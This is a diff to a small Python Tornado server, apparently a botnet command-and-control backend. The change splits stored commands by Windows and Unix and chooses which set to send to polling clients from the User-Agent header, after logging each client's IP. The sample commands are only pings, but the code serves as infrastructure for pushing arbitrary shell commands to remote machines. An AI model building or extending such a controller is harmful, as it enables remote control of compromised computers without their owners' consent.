@@ -70,14 +70,20 @@ class CommandHandler(tornado.web.RequestHandler):
     def post(self):
         # add method
         key = self.get_argument('key', '')
+        sys_os = self.get_argument('os', 'unix')
         command = self.get_argument('command', '')
-        self.application.commands[key] = command
+        if sys_os in ['windows', 'unix']:
+            self.application.commands[sys_os][key] = command
+        else:
+            self.set_status(400)
 
     def delete(self):
         # delete method
         key = self.get_argument('key', '')
         if key in self.application.commands:
             del self.application.commands[key]
+        else:
+            self.set_status(404)
 
 
 
@@ -89,10 +95,13 @@ class BotnetCommandsController(tornado.web.RequestHandler):
 
         clientinfo = {}  # todo
         self.application.clients_cache.add_node(clientIp, clientinfo)
+
         #commands = CommandsService.get_commands(os, primaryLanguage, clientIp)
-
-        self.write(' && '.join(self.application.commands.values()))
-
+        if 'windows' in headers.get('User-Agent', '').lower():
+            self.write(' ; '.join(self.application.commands['windows'].values()))
+        else:
+            # unix system
+            self.write(' && '.join(self.application.commands['unix'].values()))
 
 class Application(tornado.web.Application):
     """
@@ -108,9 +117,15 @@ class Application(tornado.web.Application):
         self.clients_cache = ClientCache()
         self.com_service = CommandsService()
 
-        self.commands = {
-            'pingas': 'ping -c 2 google.com'
-        }
+        self.commands =dict(
+            windows={
+                'pingas': 'ping -n 2 google.com',
+                'nepingas': 'ping -n 2 facebook.com'
+            },
+            unix={
+                'pingas': 'ping -c 2 google.com',
+                'nepingas': 'ping -c 2 facebook.com'
+            })
 
         settings = dict(
             template_path=os.path.join(os.path.dirname(__file__), "files"),
